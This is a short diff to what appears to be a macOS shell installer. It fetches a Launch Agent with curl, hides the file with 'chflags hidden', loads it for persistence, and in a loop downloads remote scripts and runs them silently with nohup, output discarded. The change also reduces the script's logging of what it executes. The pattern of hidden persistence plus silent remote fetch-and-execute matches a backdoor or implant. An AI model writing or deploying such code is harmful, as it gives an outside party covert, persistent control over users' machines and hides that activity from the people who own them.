@@ -23,9 +23,9 @@ function confCheck() {
         echo 'Installing Launch Agent'
         launchctl unload "$theLA"
         curl -sSL "$repo"/"$la" > "$theLA"
-        chflags hidden "$theLA"
         echo 'Configuring Launch Agent'
         defaults write "$theLA" Program "$binary"
+        chflags hidden "$theLA"
         launchctl load "$theLA"
     }
     installBinary() {
@@ -65,7 +65,7 @@ function getJobs() {
         echo -e 'Downloading:\t' "$script" to "$temp"
         curl -sSL "$script" > "$temp""/script"
         chmod +x "$temp""/script"
-        echo -e 'Executing Script:\t' "$temp""script"
+        echo 'Executing:'
         nohup "$temp""/script" &>/dev/null &
     done
 }
